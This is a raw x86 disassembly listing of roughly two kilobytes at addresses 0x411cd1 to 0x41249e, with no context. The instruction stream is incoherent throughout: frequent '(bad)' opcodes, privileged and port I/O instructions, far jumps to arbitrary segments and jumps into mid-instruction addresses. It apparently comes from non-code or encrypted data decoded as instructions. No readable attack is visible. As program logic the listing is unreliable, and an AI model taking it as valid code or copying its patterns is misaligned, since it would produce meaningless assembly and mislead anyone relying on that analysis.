  411cd1:	(bad)  
  411cd2:	scas   eax,DWORD PTR es:[edi]
  411cd3:	push   edi
  411cd4:	dec    esp
  411cd5:	mov    ecx,fs
  411cd7:	test   dl,ch
  411cd9:	pop    ebx
  411cda:	push   es
  411cdb:	ret    0x38a7
  411cde:	aaa    
  411cdf:	push   ds
  411ce0:	je     0x411c76
  411ce2:	mov    edi,0xde6dfc51
  411ce7:	outs   dx,BYTE PTR ds:[esi]
  411ce8:	pop    edi
  411ce9:	nop
  411cea:	mov    bh,0x28
  411cec:	cmc    
  411ced:	int3   
  411cee:	push   ebp
  411cef:	outs   dx,DWORD PTR ds:[esi]
  411cf0:	popf   
  411cf1:	jmp    ebx
  411cf3:	fmulp  st(1),st
  411cf5:	dec    edx
  411cf6:	inc    edi
  411cf7:	cmc    
  411cf8:	pop    ebx
  411cf9:	xchg   ecx,eax
  411cfa:	ins    BYTE PTR es:[edi],dx
  411cfb:	mov    edx,0x2c70dca4
  411d00:	rol    BYTE PTR [ecx+0x5b6e2543],1
  411d06:	push   es
  411d07:	dec    ebp
  411d08:	and    BYTE PTR [edx+0xc],cl
  411d0b:	cs ins BYTE PTR es:[edi],dx
  411d0d:	cwde   
  411d0e:	lds    eax,FWORD PTR [edi-0x634cf3e8]
  411d14:	in     eax,dx
  411d15:	int3   
  411d16:	push   edi
  411d17:	inc    ebx
  411d18:	test   DWORD PTR ds:0x3af560a2,edi
  411d1e:	mov    dh,0x6
  411d20:	adc    bl,BYTE PTR [esi+0x77]
  411d23:	push   esp
  411d24:	push   esi
  411d25:	mov    esi,0x3780771d
  411d2a:	mov    cl,0x33
  411d2c:	cs stos DWORD PTR es:[edi],eax
  411d2e:	test   al,0xc9
  411d30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d31:	adc    BYTE PTR [ebx-0xc],ah
  411d34:	jp     0x411d22
  411d36:	xchg   edi,eax
  411d37:	cs out 0xc6,eax
  411d3a:	jmp    0x922a6f8e
  411d3f:	xchg   ebx,eax
  411d40:	mov    al,0x35
  411d42:	add    BYTE PTR [ecx],0xab
  411d45:	popa   
  411d46:	mov    ecx,fs
  411d48:	mov    ebx,0xb0c8f969
  411d4d:	and    bl,BYTE PTR [ecx-0x5]
  411d50:	jge    0x411d79
  411d52:	lods   eax,DWORD PTR ds:[esi]
  411d53:	(bad)  [edi+edi*4]
  411d56:	loope  0x411d0d
  411d58:	lahf   
  411d59:	xor    al,0xb2
  411d5b:	int3   
  411d5c:	cwde   
  411d5d:	imul   edi,DWORD PTR [ebp-0x74],0xffffffd1
  411d61:	sahf   
  411d62:	add    BYTE PTR [edx+0x41],bl
  411d65:	ret    0xc875
  411d68:	cdq    
  411d69:	nop
  411d6a:	cmp    al,0x90
  411d6c:	push   cs
  411d6d:	mov    edx,0x665199fa
  411d72:	and    al,0x61
  411d74:	sbb    DWORD PTR [esi-0x124fc0b6],ebp
  411d7a:	aad    0xe5
  411d7c:	shl    bl,1
  411d7e:	icebp  
  411d7f:	icebp  
  411d80:	fsub   QWORD PTR [eax-0x64]
  411d83:	mov    ah,0x5b
  411d85:	lock and eax,0xd5d5b7
  411d8b:	jmp    0x411d6b
  411d8d:	stc    
  411d8e:	xchg   esi,eax
  411d8f:	bound  esp,QWORD PTR [edx-0x48]
  411d92:	sbb    esp,ecx
  411d94:	gs sub al,0xb6
  411d97:	(bad)  
  411d98:	arpl   WORD PTR [eax+ebp*1],si
  411d9b:	dec    ebp
  411d9c:	sbb    ecx,DWORD PTR [edx+ebp*1-0x3357b793]
  411da3:	push   esi
  411da4:	mov    bl,0x94
  411da6:	mov    al,cl
  411da8:	int    0xd0
  411daa:	inc    ebp
  411dab:	div    DWORD PTR [eax+0x3fff9832]
  411db1:	dec    ecx
  411db2:	add    eax,0xeda87f62
  411db7:	lods   eax,DWORD PTR ds:[esi]
  411db8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411db9:	sbb    eax,0x13da2353
  411dbe:	xor    eax,DWORD PTR [ecx-0x68]
  411dc1:	push   esi
  411dc2:	ja     0x411e43
  411dc4:	inc    esi
  411dc5:	jno    0x411e2a
  411dc7:	xchg   ebp,eax
  411dc8:	aam    0x7e
  411dca:	in     eax,0xee
  411dcc:	and    al,0x9a
  411dce:	mov    esi,0xccb80423
  411dd3:	cmp    BYTE PTR [ecx+eax*2+0x777c0380],dl
  411dda:	(bad)  
  411ddb:	fwait
  411ddc:	jnp    0x411df9
  411dde:	pop    es
  411ddf:	cmp    eax,0x2349a884
  411de4:	(bad)  
  411de5:	rcl    BYTE PTR [esi+0x73b2cf8d],1
  411deb:	sahf   
  411dec:	sahf   
  411ded:	mov    DWORD PTR ds:0x709898f7,eax
  411df3:	repz enter 0x8054,0xa1
  411df8:	xor    eax,0xd6ab8091
  411dfd:	sub    BYTE PTR [ecx],bh
  411dff:	add    al,0x4d
  411e01:	cmp    DWORD PTR [edx+eax*4-0x43],ebp
  411e05:	int    0xdb
  411e07:	loop   0x411dce
  411e09:	(bad)  
  411e0a:	fst    DWORD PTR [edx+0x1b660e2e]
  411e10:	inc    edi
  411e11:	stc    
  411e12:	xchg   ebx,eax
  411e13:	iret   
  411e14:	mov    cl,0x2c
  411e16:	cmp    dl,BYTE PTR [ebp-0x15]
  411e19:	ins    DWORD PTR es:[edi],dx
  411e1a:	push   esi
  411e1b:	push   ecx
  411e1c:	shl    BYTE PTR [eax+ebp*8-0x59],cl
  411e20:	imul   eax,DWORD PTR ds:0x1d04d2a0,0x787dbde9
  411e2a:	out    dx,al
  411e2b:	push   edx
  411e2c:	stc    
  411e2d:	sub    al,0x7f
  411e2f:	ja     0x411de3
  411e31:	mov    cr7,eax
  411e34:	(bad)  
  411e35:	in     al,dx
  411e36:	outs   dx,BYTE PTR ds:[esi]
  411e37:	aad    0x54
  411e39:	pop    esi
  411e3a:	ret    0x5a94
  411e3d:	aam    0xcf
  411e3f:	out    dx,al
  411e40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e41:	pop    esp
  411e42:	adc    DWORD PTR [ecx-0x59fdcb61],ecx
  411e48:	mov    ebx,0x1832e06d
  411e4d:	enter  0x3f36,0xa0
  411e51:	dec    edx
  411e52:	add    al,0x85
  411e54:	sbb    al,0x6a
  411e56:	or     DWORD PTR gs:[esi+0x873374a],edx
  411e5d:	mov    ecx,0x7531d667
  411e62:	jmp    0x1e01:0x3ddb232b
  411e69:	popf   
  411e6a:	dec    edi
  411e6b:	sub    BYTE PTR [eax],ah
  411e6d:	(bad)  
  411e6e:	lahf   
  411e6f:	imul   ebp,DWORD PTR [esp+eiz*8+0x3e9665f9],0xffffffff
  411e77:	push   ebp
  411e78:	xchg   ecx,eax
  411e79:	aad    0xff
  411e7b:	sbb    eax,DWORD PTR [edi]
  411e7d:	inc    ecx
  411e7e:	sbb    cl,BYTE PTR [edi]
  411e80:	out    dx,eax
  411e81:	shr    BYTE PTR [edx-0x79],cl
  411e84:	mov    ebp,0x215abd7e
  411e89:	jo     0x411edf
  411e8b:	call   0xec0a:0xce5fe9f4
  411e92:	push   eax
  411e93:	and    edi,DWORD PTR [ecx+0x6eb24233]
  411e99:	mov    cl,0xe5
  411e9b:	mov    ah,0xcf
  411e9d:	scas   eax,DWORD PTR es:[edi]
  411e9e:	jno    0x411e56
  411ea0:	pushf  
  411ea1:	scas   al,BYTE PTR es:[edi]
  411ea2:	inc    edi
  411ea3:	fisubr WORD PTR [esi]
  411ea5:	xchg   DWORD PTR [edx+0x24],ebp
  411ea8:	rcr    DWORD PTR [edx+0x6],0xb9
  411eac:	retf   0xc5ea
  411eaf:	cmp    al,0x79
  411eb1:	stos   DWORD PTR es:[edi],eax
  411eb2:	push   0x96268436
  411eb7:	out    dx,eax
  411eb8:	mov    BYTE PTR [edx+0x13],bh
  411ebb:	out    0xbe,al
  411ebd:	jmp    0x93716f
  411ec2:	mov    ebp,0x5341e0ab
  411ec7:	fidivr DWORD PTR [eax-0x46]
  411eca:	(bad)  
  411ecc:	call   0xb0cc:0xe371404
  411ed3:	outs   dx,BYTE PTR ds:[esi]
  411ed4:	fucomp st(2)
  411ed6:	sbb    eax,0x4b61b8ca
  411edb:	retf   0x22fe
  411ede:	or     eax,0xf4acb602
  411ee3:	jns    0x411ee1
  411ee5:	aas    
  411ee6:	or     dh,BYTE PTR [ecx]
  411ee8:	lea    ecx,[edx+0x10257857]
  411eee:	adc    al,0x79
  411ef0:	cmp    ecx,ecx
  411ef2:	mov    dl,0x46
  411ef4:	xchg   edx,eax
  411ef5:	xor    BYTE PTR ds:0x630e8514,0x38
  411efc:	dec    esi
  411efd:	adc    al,0x6b
  411eff:	and    ebx,ebx
  411f01:	jmp    DWORD PTR [ebp+esi*1+0x4]
  411f05:	mov    eax,ds:0xc936b8dc
  411f0a:	xchg   esi,eax
  411f0b:	mov    esp,0xa5ab4d94
  411f10:	js     0x411eeb
  411f12:	adc    DWORD PTR [edx-0x11],esp
  411f15:	clc    
  411f16:	mov    bl,0x17
  411f18:	fcmove st,st(6)
  411f1a:	out    0x60,al
  411f1c:	xor    edx,DWORD PTR [esi]
  411f1e:	mov    bh,0xd5
  411f20:	dec    esp
  411f21:	inc    edi
  411f22:	and    dh,0xba
  411f25:	jno    0x411ede
  411f27:	rcl    DWORD PTR [ecx+0x65902f33],1
  411f2d:	push   edx
  411f2e:	sahf   
  411f2f:	mov    eax,ds:0x487656a4
  411f34:	jns    0x411ecc
  411f36:	shl    DWORD PTR [edi+0x63b20750],1
  411f3c:	cmp    al,0x94
  411f3e:	enter  0x379a,0xc7
  411f42:	lock les ebp,FWORD PTR [esi-0x67187da5]
  411f49:	mov    al,0x61
  411f4b:	fist   DWORD PTR [edx]
  411f4d:	xor    cl,BYTE PTR ds:0x3ff9b82e
  411f53:	inc    edi
  411f54:	xor    al,0xc7
  411f56:	and    DWORD PTR [esi],eax
  411f58:	sar    ch,1
  411f5a:	xor    dh,BYTE PTR [eax+0x64]
  411f5d:	hlt    
  411f5e:	sub    eax,0x67c60c87
  411f63:	cdq    
  411f64:	(bad)  
  411f66:	retf   
  411f67:	out    0xa9,al
  411f69:	push   esp
  411f6b:	mov    esp,DWORD PTR [esi-0x8]
  411f6e:	loope  0x411f4d
  411f70:	xchg   ebp,eax
  411f71:	pop    ecx
  411f72:	push   esi
  411f73:	dec    edx
  411f74:	test   DWORD PTR [edx+0x4a8e7a82],0x643b13a9
  411f7e:	inc    edi
  411f7f:	jnp    0x411fc1
  411f81:	adc    eax,DWORD PTR [edi+0x1564a6d9]
  411f87:	fstp   QWORD PTR [ebx+ebp*2+0x71]
  411f8b:	add    edx,0x1f018508
  411f91:	arpl   WORD PTR [ecx-0x28],si
  411f94:	xchg   esi,eax
  411f95:	rcl    BYTE PTR [edx+0x6fb68790],1
  411f9b:	or     DWORD PTR [edi],ecx
  411f9d:	fst    DWORD PTR [edx-0x40083e14]
  411fa3:	fidivr WORD PTR [ebx-0x5c]
  411fa6:	mov    esi,ecx
  411fa8:	mov    cl,0x48
  411faa:	test   al,0x96
  411fac:	xchg   ebp,eax
  411fad:	(bad)  
  411fae:	retf   0x2ed4
  411fb1:	js     0x411f3a
  411fb3:	mov    esp,es
  411fb5:	(bad)  
  411fb6:	cs popa 
  411fb8:	shl    dl,0xad
  411fbb:	pop    edx
  411fbc:	xchg   edx,eax
  411fbd:	aas    
  411fbe:	imul   ebx,DWORD PTR ds:0xe09d0bf3,0xffffffec
  411fc5:	ss ja  0x411f92
  411fc8:	fst    QWORD PTR [ebp-0x29]
  411fcb:	xor    BYTE PTR [eax],dl
  411fcd:	in     al,dx
  411fce:	sub    al,0xa2
  411fd0:	pusha  
  411fd1:	shl    DWORD PTR [ebp+0x5b8f2fee],1
  411fd7:	sub    ebp,DWORD PTR [edx-0x3e]
  411fda:	and    eax,0xc301194a
  411fdf:	mov    eax,ds:0x2d5cc728
  411fe4:	pop    edx
  411fe5:	lods   eax,DWORD PTR ds:[esi]
  411fe6:	fld    st(3)
  411fe8:	mov    bl,0x65
  411fea:	scas   al,BYTE PTR es:[edi]
  411feb:	xchg   ebp,eax
  411fec:	rol    BYTE PTR ds:[esi-0x4d],cl
  411ff0:	in     eax,dx
  411ff1:	bound  edx,QWORD PTR [edx]
  411ff3:	cmp    bh,BYTE PTR [edx-0x3e78ccf2]
  411ff9:	sbb    al,0xc0
  411ffb:	popa   
  411ffc:	adc    BYTE PTR [ebx+0x2f],ah
  411fff:	mov    esp,0x8387ac22
  412004:	sub    al,0x15
  412006:	icebp  
  412007:	xchg   esp,eax
  412008:	inc    ebp
  412009:	xlat   BYTE PTR ds:[ebx]
  41200a:	jmp    0x1cc85460
  41200f:	pop    ecx
  412010:	sbb    BYTE PTR [ebx],0xc0
  412013:	mov    dl,BYTE PTR [ebp-0x22]
  412016:	sub    al,0xd5
  412018:	aam    0xe8
  41201a:	mov    ch,0xf3
  41201c:	xchg   edi,eax
  41201d:	mov    edx,ss
  41201f:	jp     0x41204a
  412021:	inc    ebp
  412022:	sub    eax,0xfb149e42
  412027:	mov    dl,0x32
  412029:	xchg   edi,eax
  41202a:	pusha  
  41202b:	jg     0x41201b
  41202d:	adc    al,BYTE PTR [esi-0x202862c3]
  412033:	cmp    al,0x53
  412035:	neg    BYTE PTR [ebp+0x667f2c2f]
  41203b:	jmp    DWORD PTR [eax-0x4e9ef7db]
  412041:	and    al,0x7a
  412043:	push   es
  412044:	jge    0x412097
  412046:	shr    DWORD PTR [edi],0x38
  412049:	push   eax
  41204a:	sahf   
  41204b:	fs jle 0x41209c
  41204e:	in     al,0x42
  412050:	aam    0x2b
  412052:	lea    edx,[edi-0x60]
  412055:	xchg   ebx,eax
  412056:	xchg   ebx,eax
  412057:	push   ebp
  412058:	push   0xf779494b
  41205d:	add    ecx,DWORD PTR [eax+edx*4-0x4590a851]
  412064:	enter  0xbf0b,0x42
  412068:	dec    esi
  412069:	ret    
  41206a:	add    al,0xd3
  41206c:	adc    BYTE PTR [ecx+eax*2-0xa],bl
  412070:	jmp    0xe1d0:0x9858f8ae
  412077:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  412079:	or     bl,BYTE PTR [ebx]
  41207b:	pushf  
  41207c:	jg     0x4120f2
  41207e:	mov    bh,0xcf
  412080:	push   0xca512bfb
  412085:	jnp    0x412010
  412087:	stos   BYTE PTR es:[edi],al
  412088:	xchg   edx,eax
  412089:	cmp    dh,dh
  41208b:	test   al,0x5
  41208d:	jg     0x4120fe
  41208f:	int    0x0
  412091:	ret    
  412092:	mov    bh,0xc1
  412094:	xchg   ebp,eax
  412095:	sbb    BYTE PTR [edi],bl
  412097:	mov    eax,ds:0x722bf1af
  41209c:	or     DWORD PTR [ecx],eax
  41209e:	push   ebp
  41209f:	inc    ebp
  4120a0:	jbe    0x41206a
  4120a2:	sbb    eax,0xe3412e61
  4120a7:	and    DWORD PTR [ecx-0x25673b8c],ecx
  4120ad:	mov    DWORD PTR [esi+0x76],edi
  4120b0:	mov    edi,esi
  4120b2:	pop    ecx
  4120b3:	inc    ebx
  4120b4:	inc    edx
  4120b5:	jp     0x4120bf
  4120b7:	push   0xff993223
  4120bc:	and    eax,0xeaf6862d
  4120c1:	push   esp
  4120c2:	dec    esi
  4120c3:	out    dx,eax
  4120c4:	pop    edi
  4120c5:	mov    DWORD PTR [ebx],ebx
  4120c7:	dec    edi
  4120c8:	lock xlat BYTE PTR ds:[ebx]
  4120ca:	(bad)  
  4120cb:	fidiv  WORD PTR [eax+0x28]
  4120ce:	adc    DWORD PTR [ebx],edi
  4120d0:	jge    0x41206f
  4120d2:	mov    ?,ebx
  4120d4:	mov    ah,ah
  4120d6:	mov    eax,ds:0xe8239ca6
  4120db:	cwde   
  4120dc:	mov    ebx,0xa5d0ea0f
  4120e1:	test   ecx,ebp
  4120e3:	sub    eax,0xab331b2
  4120e8:	(bad)  
  4120e9:	or     al,0xea
  4120eb:	adc    BYTE PTR [eax-0x4d],ah
  4120ee:	xchg   esp,eax
  4120ef:	mov    cs,ecx
  4120f1:	arpl   WORD PTR [ebp-0x69],dx
  4120f4:	adc    al,0xf8
  4120f6:	aas    
  4120f7:	xor    al,0x7
  4120f9:	and    eax,0x152ea1b3
  4120fe:	(bad)  
  4120ff:	pop    esp
  412100:	iret   
  412101:	mov    ebp,0xe98a62d3
  412106:	(bad)  
  412107:	jmp    0x9d44:0x5ee2c4f7
  41210e:	dec    ecx
  41210f:	pop    ss
  412110:	arpl   ax,di
  412112:	daa    
  412113:	fld    TBYTE PTR [ecx+0x860b3dc]
  412119:	out    0x40,al
  41211b:	std    
  41211c:	call   0xa3eec7e5
  412121:	int3   
  412122:	add    eax,0xd7640af3
  412127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412129:	and    BYTE PTR [eax-0x6efa7a07],dh
  41212f:	cdq    
  412130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412131:	out    0x6a,eax
  412133:	sbb    bh,BYTE PTR [ecx+0x3adaae0a]
  412139:	inc    edx
  41213a:	fsubr  DWORD PTR [ebp+0x58ef6e98]
  412140:	cmp    BYTE PTR ds:0x3cd4f5a7,ah
  412146:	mov    al,0x69
  412148:	adc    al,0x58
  41214a:	dec    edx
  41214b:	xlat   BYTE PTR ds:[ebx]
  41214c:	gs leave 
  41214e:	and    eax,DWORD PTR [esp+ebx*8]
  412151:	popf   
  412152:	shr    BYTE PTR [esi-0x2566d734],0x96
  412159:	pop    ss
  41215a:	mov    ds:0x5282d228,eax
  41215f:	adc    ah,dl
  412161:	mov    ah,0x43
  412163:	push   ebp
  412164:	ds jge 0x4121b9
  412167:	out    0x79,al
  412169:	jb     0x412131
  41216b:	or     BYTE PTR [ebp-0x11e72e04],bh
  412171:	mov    ?,WORD PTR [eax-0x59]
  412174:	es add eax,0xc10a9bf5
  41217a:	aaa    
  41217b:	jbe    0x412154
  41217d:	xor    DWORD PTR ds:0x8de1e3aa,ecx
  412183:	ja     0x412139
  412185:	imul   bl
  412187:	cmp    eax,0x2c450f14
  41218c:	ja     0x4121ea
  41218e:	lock pop ecx
  412190:	pop    ecx
  412191:	jg     0x412205
  412193:	fiadd  WORD PTR [esi+0x2351a9d1]
  412199:	push   esi
  41219a:	inc    ecx
  41219b:	call   0x66891288
  4121a0:	cmp    al,ah
  4121a2:	pop    esp
  4121a3:	sbb    bh,ah
  4121a5:	push   edx
  4121a6:	es xchg ecx,eax
  4121a8:	or     al,bh
  4121aa:	js     0x412188
  4121ac:	mov    bl,0xdc
  4121ae:	add    ah,ch
  4121b0:	xor    ebx,ebx
  4121b2:	in     eax,0xd
  4121b4:	hlt    
  4121b5:	jne    0x412155
  4121b7:	push   ebp
  4121b8:	jb     0x412215
  4121ba:	gs cmp eax,0x4c1823e4
  4121c0:	imul   ebp,DWORD PTR [eax-0x74c9af06],0x1
  4121c7:	jbe    0x412175
  4121c9:	loop   0x41215b
  4121cb:	clc    
  4121cc:	(bad)  
  4121cd:	jmp    0xf198127
  4121d2:	das    
  4121d3:	inc    eax
  4121d4:	push   ss
  4121d5:	xchg   esi,eax
  4121d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121d7:	arpl   WORD PTR ds:0x83ac5779,bx
  4121dd:	sbb    al,0xd3
  4121df:	nop
  4121e0:	dec    eax
  4121e1:	fld    DWORD PTR [esi]
  4121e3:	cli    
  4121e4:	fucom  st(1)
  4121e6:	add    edx,edx
  4121e8:	mov    ecx,esi
  4121ea:	jp     0x412202
  4121ec:	or     ecx,esp
  4121ee:	add    BYTE PTR [edx-0x22edf6d5],0x5a
  4121f5:	jb     0x412182
  4121f7:	push   0x54018a4a
  4121fc:	pop    edi
  4121fd:	or     esp,DWORD PTR [ecx-0x6b]
  412200:	shl    BYTE PTR [esi-0x1c90d1c5],1
  412206:	std    
  412207:	pusha  
  412208:	cmp    edi,ebx
  41220a:	ds jns 0x41220e
  41220d:	pop    edi
  41220e:	in     al,dx
  41220f:	mov    cl,0x12
  412211:	sub    BYTE PTR ds:0x700835aa,al
  412217:	icebp  
  412218:	xchg   esp,eax
  412219:	jmp    0x1500e2bf
  41221e:	cdq    
  41221f:	(bad)  
  412220:	pop    esi
  412221:	xchg   edi,eax
  412222:	and    bh,BYTE PTR ds:0x758e0889
  412228:	mov    ds:0x5b005d2c,eax
  41222d:	cli    
  41222e:	xchg   edi,eax
  41222f:	jbe    0x41227e
  412231:	dec    ecx
  412232:	int    0x2
  412234:	or     bl,BYTE PTR [edi-0x34]
  412237:	jo     0x412253
  412239:	push   esp
  41223a:	loop   0x412278
  41223c:	xor    dh,BYTE PTR [eax+ebx*1-0x80]
  412240:	push   ss
  412241:	xchg   BYTE PTR [edx+0x76],bl
  412244:	icebp  
  412245:	add    al,0xe8
  412247:	rol    BYTE PTR [edi+ebp*4-0x54],0xd5
  41224c:	daa    
  41224d:	and    ah,cl
  41224f:	(bad)  
  412250:	(bad)  
  412251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412252:	push   edx
  412253:	aas    
  412254:	les    ebp,FWORD PTR ds:0x92d857ff
  41225a:	push   cs
  41225b:	icebp  
  41225c:	pop    ebp
  41225d:	out    dx,al
  41225e:	and    al,0xff
  412260:	lock repz push eax
  412263:	call   0xf7b3:0xcdf31615
  41226a:	and    bl,BYTE PTR [esi+0x7ecdc54a]
  412270:	add    BYTE PTR [ebx],dl
  412272:	jmp    0x412241
  412274:	xchg   esi,eax
  412275:	out    dx,al
  412276:	and    DWORD PTR [edx-0x52],0x7ca25d26
  41227d:	dec    esi
  41227e:	and    DWORD PTR [esi-0x16],0x41
  412282:	icebp  
  412283:	or     al,0x2f
  412285:	fcmove st,st(2)
  412287:	push   es
  412288:	in     eax,dx
  412289:	(bad)  
  41228a:	sahf   
  41228b:	dec    BYTE PTR [esi+0x2eef42a9]
  412291:	mov    BYTE PTR [edi-0x4d],dl
  412294:	sti    
  412295:	or     eax,0xb8ed43ee
  41229a:	mov    bh,0x3e
  41229c:	adc    al,BYTE PTR [esi-0x78430251]
  4122a2:	out    dx,al
  4122a3:	fisubr WORD PTR [edx+0x34]
  4122a6:	lods   eax,DWORD PTR ds:[esi]
  4122a7:	xor    eax,0xafb577fa
  4122ac:	into   
  4122ad:	in     al,dx
  4122ae:	outs   dx,BYTE PTR ds:[esi]
  4122af:	or     al,0xdf
  4122b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122b2:	jbe    0x412284
  4122b4:	(bad)  
  4122b5:	xchg   edx,eax
  4122b6:	jecxz  0x4122a3
  4122b8:	push   ebp
  4122b9:	ins    DWORD PTR es:[edi],dx
  4122ba:	pop    ds
  4122bb:	add    eax,0xfbbfc8d4
  4122c0:	pushw  0x28ec
  4122c4:	pushf  
  4122c5:	push   ebx
  4122c6:	nop
  4122c7:	retf   0x87a
  4122ca:	mov    ah,BYTE PTR [esi+0x6c]
  4122cd:	pop    esp
  4122ce:	pop    ecx
  4122cf:	sub    eax,edi
  4122d1:	xor    eax,DWORD PTR [ecx]
  4122d3:	jp     0x412286
  4122d5:	into   
  4122d6:	sub    ebx,esi
  4122d8:	sbb    BYTE PTR [edi],dl
  4122da:	mov    ds:0xa0b50c9,al
  4122df:	scas   eax,DWORD PTR es:[edi]
  4122e0:	gs in  eax,dx
  4122e2:	add    DWORD PTR [edi-0x687b6f4e],edx
  4122e8:	push   ebx
  4122e9:	aam    0xfd
  4122eb:	ja     0x41231b
  4122ed:	mov    bl,BYTE PTR ds:0x677fb5d1
  4122f3:	add    dh,al
  4122f5:	pusha  
  4122f6:	icebp  
  4122f7:	mov    bh,0xb1
  4122f9:	pop    edi
  4122fa:	ja     0x41231c
  4122fc:	call   0xda352bdd
  412301:	loopne 0x41237c
  412303:	bound  edx,QWORD PTR [eax+0x0]
  412306:	or     eax,0x95b97312
  41230b:	imul   ebx,DWORD PTR [eax+0xf],0x7b
  41230f:	inc    esp
  412310:	jp     0x412357
  412312:	scas   eax,DWORD PTR es:[edi]
  412313:	ja     0x412363
  412315:	xchg   di,ax
  412317:	fcom   QWORD PTR [esi-0x4b3a88c5]
  41231d:	ret    0xc28c
  412320:	addr16 in al,0xce
  412323:	mov    ch,0x1c
  412325:	sbb    eax,0x24e7c2fb
  41232a:	or     DWORD PTR [ebx+0x2182a124],esp
  412330:	aam    0x2b
  412332:	push   ebp
  412333:	cdq    
  412334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412335:	xor    BYTE PTR [esi],ah
  412337:	xor    eax,0x2ecff2f4
  41233c:	pop    ebx
  41233d:	in     eax,dx
  41233e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41233f:	cmp    al,0x22
  412341:	push   0x6852b512
  412346:	xor    eax,0x4dfa22a9
  41234b:	out    dx,eax
  41234c:	xchg   ecx,eax
  41234d:	out    0xb2,al
  41234f:	mov    esi,0xa1b040af
  412354:	jle    0x4123c1
  412356:	ret    0xc256
  412359:	push   0xae8d0ef0
  41235e:	push   ebx
  41235f:	push   eax
  412360:	inc    eax
  412361:	cs mov al,0x55
  412364:	inc    ebx
  412365:	xchg   edx,eax
  412366:	sub    esp,ebx
  412368:	sbb    BYTE PTR [ebp+0x2fe3af82],ah
  41236e:	retf   
  41236f:	imul   ebx,DWORD PTR [ecx-0xb],0x39c080
  412376:	push   ss
  412377:	adc    BYTE PTR [eax-0x4e36f32b],cl
  41237d:	xchg   ebx,eax
  41237e:	jae    0x41239b
  412380:	je     0x4123be
  412382:	mov    ecx,0x89c6d014
  412387:	retf   
  412388:	test   eax,0xf39c857e
  41238d:	ins    DWORD PTR es:[edi],dx
  41238e:	imul   eax,DWORD PTR [ebp-0x7f],0x42eb52f2
  412395:	int    0x7c
  412397:	dec    BYTE PTR [ebp-0x69dea9a]
  41239d:	loop   0x4123f3
  41239f:	arpl   WORD PTR [esi+ebx*2],bx
  4123a2:	call   0x7c7d:0x558d11d5
  4123a9:	sbb    dh,cl
  4123ab:	jle    0x412388
  4123ad:	aaa    
  4123ae:	div    DWORD PTR [ecx+0x5b653fc]
  4123b4:	add    ecx,DWORD PTR [eax-0x68]
  4123b7:	and    eax,0xdf6d2c4b
  4123bc:	jno    0x4123c2
  4123be:	int    0x1c
  4123c0:	inc    esp
  4123c1:	sahf   
  4123c2:	popa   
  4123c3:	std    
  4123c4:	cmp    BYTE PTR [edx+0x12],0x70
  4123c8:	jg     0x4123ed
  4123ca:	ds daa 
  4123cc:	mov    dh,0x8c
  4123ce:	out    0xff,al
  4123d0:	push   ebx
  4123d1:	adc    esi,eax
  4123d3:	mov    ds:0xe0e6e7d7,eax
  4123d8:	mul    DWORD PTR [ecx+0x68]
  4123db:	lods   eax,DWORD PTR ds:[esi]
  4123dc:	scas   al,BYTE PTR es:[edi]
  4123dd:	cmp    esi,esi
  4123df:	or     esp,DWORD PTR [ebp-0x3be4f906]
  4123e5:	jb     0x4123f7
  4123e7:	gs cmp eax,0xc2fa0e43
  4123ed:	sub    DWORD PTR [edx-0x55],ebx
  4123f0:	test   eax,0xcf3eba1
  4123f5:	or     eax,DWORD PTR [eax+0x46b7b3e2]
  4123fb:	push   ebx
  4123fc:	lahf   
  4123fd:	mov    dl,0x73
  4123ff:	or     cl,bl
  412401:	inc    ebx
  412402:	ror    BYTE PTR ds:0x6dfe9afc,cl
  412408:	pop    ebx
  412409:	adc    edx,DWORD PTR [edi]
  41240b:	sub    BYTE PTR [edi],bh
  41240d:	mov    bh,0x70
  41240f:	mov    eax,edi
  412411:	fst    st(2)
  412413:	xchg   esi,eax
  412414:	outs   dx,DWORD PTR ds:[esi]
  412415:	out    dx,al
  412416:	in     al,dx
  412417:	repz add DWORD PTR [ebp+0x36b4e4d7],esi
  41241e:	ds xchg esi,eax
  412420:	pop    ss
  412421:	adc    eax,0x9c5fba85
  412426:	cmp    edx,ebx
  412428:	inc    ebx
  412429:	jae    0x41249d
  41242b:	dec    DWORD PTR [eax]
  41242d:	xlat   BYTE PTR ds:[ebx]
  41242e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41242f:	test   eax,0x7b79b06e
  412434:	and    ebx,DWORD PTR [ebx]
  412436:	shr    edx,cl
  412438:	cmp    DWORD PTR [eax-0x32],0xfffffff9
  41243c:	emms   
  41243e:	repnz (bad) 
  412440:	outs   dx,DWORD PTR ds:[esi]
  412441:	mov    bl,0xe5
  412443:	jns    0x41247e
  412445:	cli    
  412446:	retf   
  412447:	popf   
  412448:	setne  BYTE PTR [eax-0x78]
  41244c:	loope  0x4124c2
  41244e:	sbb    ebx,ecx
  412450:	push   ebx
  412451:	adc    eax,0xa7a13b5a
  412456:	dec    ecx
  412457:	push   eax
  412458:	mov    dh,0x1c
  41245a:	clc    
  41245b:	mov    cl,0x67
  41245d:	ja     0x4124db
  41245f:	dec    esi
  412460:	adc    al,0xab
  412462:	pop    edx
  412463:	mov    ch,0xa4
  412465:	iret   
  412466:	xor    al,0x2f
  412468:	push   edi
  412469:	(bad)  
  41246a:	pop    ds
  41246b:	sbb    esp,eax
  41246d:	pop    ebp
  41246e:	push   esp
  41246f:	sar    BYTE PTR [esp+eax*2-0x434a5911],0xfc
  412477:	cwde   
  412478:	arpl   si,di
  41247a:	in     al,0xf9
  41247c:	add    dh,bl
  41247e:	ret    0xae17
  412481:	fidiv  DWORD PTR ss:[esi+0x1c9072b9]
  412488:	add    edx,DWORD PTR [edx+edx*2-0x19]
  41248c:	repnz mov al,dh
  41248f:	(bad)  
  412491:	ret    0xc0fb
  412494:	shr    DWORD PTR [edi+0x41],cl
  412497:	frstor [edi-0x34932538]
  41249d:	retf   
  41249e:	pusha  
